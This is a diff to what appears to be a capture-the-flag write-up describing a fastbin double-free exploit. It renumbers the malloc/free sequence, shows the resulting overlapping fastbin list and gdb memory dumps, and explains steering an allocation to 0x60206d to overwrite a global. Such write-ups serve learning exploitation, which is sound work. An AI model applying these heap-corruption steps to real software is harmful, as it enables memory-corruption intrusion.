@@ -74,20 +74,20 @@ So,it have double free.
 And can use fastbin corruption,control malloc chunk to anywhere
 
 * how to do
-	* malloc(size) # 0
-	* malloc(size) # 1
-	* free(0)
+	* 1 = malloc(size) 
+	* 2 = malloc(size)
 	* free(1)
-	* free(0)
+	* free(2)
+	* free(1)
 
 then fastbin will like this:
 ```
 (0x70)     fastbin[5]: 0x603000 --> 0x603070 --> 0x603000 (overlap chunk with 0x603000(freed) )
 ```
-	* malloc(size) = 0x603000 # input aaaa
-	* malloc(size) = 0x603070
-	* malloc(size) = 0x603000
-	* malloc(size) = 0x616161 "aaaa"
+	* 3 = malloc(size) = 0x603000 # input aaaa
+	* 4 = malloc(size) = 0x603070
+	* 5 = malloc(size) = 0x603000
+	* 6 = malloc(size) = 0x616161 "aaaa"
 
 now, we know how to use this vul,and we need to overwire 0x602080,
 
@@ -104,9 +104,9 @@ gdb-peda$ x/10gx 0x602060
 
 so we use size is 0x70-0x10(size and prev size),
 
-in the first time malloc write 0x60206d in to heap
+in the 3rd time to malloc write 0x60206d in to heap
 
-and fourth time malloc will get 0x60206d because is size(+8) is 0x70 so it can pass malloc check 
+and the 6th time to malloc will get 0x60206d because is size(+8) is 0x70 so it can pass malloc check 
 
 ```
 gdb-peda$ x/2gx 0x60206d
